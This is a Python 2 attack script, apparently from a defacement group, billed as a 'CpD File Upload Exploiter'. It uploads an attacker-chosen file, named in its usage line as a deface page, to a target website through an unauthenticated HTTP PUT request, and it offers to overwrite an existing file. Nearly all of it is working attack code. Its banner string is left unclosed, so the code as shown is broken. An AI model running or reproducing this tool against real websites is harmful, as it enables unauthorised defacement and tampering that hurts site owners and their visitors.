#!/usr/bin/python

import requests
import string
import random
import sys
import os

os.system("clear")

print """
▄████▄   ██▓███  ▓█████▄    
▒██▀ ▀█  ▓██░  ██▒▒██▀ ██▌   
▒▓█    ▄ ▓██░ ██▓▒░██   █▌   
▒▓▓▄ ▄██▒▒██▄█▓▒ ▒░▓█▄   ▌   
▒ ▓███▀ ░▒██▒ ░  ░░▒████▓    
░ ░▒ ▒  ░▒▓▒░ ░  ░ ▒▒▓  ▒    
  ░  ▒   ░▒ ░      ░ ▒  ▒    
░        ░░        ░ ░  ░    
░ ░                  ░       
░                  ░         

def webdav():
  sc = ''
  with open(sys.argv[2], 'rb') as f:
      depes = f.read()
  script = depes
  host = sys.argv[1]
  if not host.startswith('http'):
    host = 'http://' + host
  nama = '/'+sys.argv[2]


  print("[*] Upload File Name : %s") % (sys.argv[2])
  print("[*] Uploading %d Bytes, Script CpD") % len(script)

  r = requests.request('put', host + nama, data=script, headers={'Content-Type':'application/octet-stream'})

  if r.status_code < 200 or r.status_code >= 300:
    print("[!] Upload failed . . .")
    sys.exit(1)
  else:
    print("[+] File uploaded . . .")
    print("[+] PATH : "+host + nama)


def cekfile():
 print("""
[*] CpD File Upload Exploiter
[*] Coded To Python By CyberPython A.s.S Team
[*] Thx To Anonymous Team For PHP Exploit
""")
 print("[*] Cek File 7o Target : "+sys.argv[1]+"/"+sys.argv[2])
 r = requests.get(sys.argv[1] +"/"+ sys.argv[2])
 if r.status_code == requests.codes.ok:
  print("[*] Di Temukan File Yg Sama Di Target . . .")
  tanya = raw_input("[!] Replace File Target ? [Y/N] > ")
  if tanya == "Y":
   webdav()
  else:
   print("[!] Exiting Tools . . .")
   sys.exit()
 else:
   print("[*] File Go To Target . . .")
   print("[*] Process Upload Script  . . .")
   webdav()


if __name__ == '__main__':
  if len(sys.argv) != 3:
    print("\n[*] Usage: "+sys.argv[0]+" Target.com ScriptDeface.htm\n")
    sys.exit(0)
  else:
    cekfile()
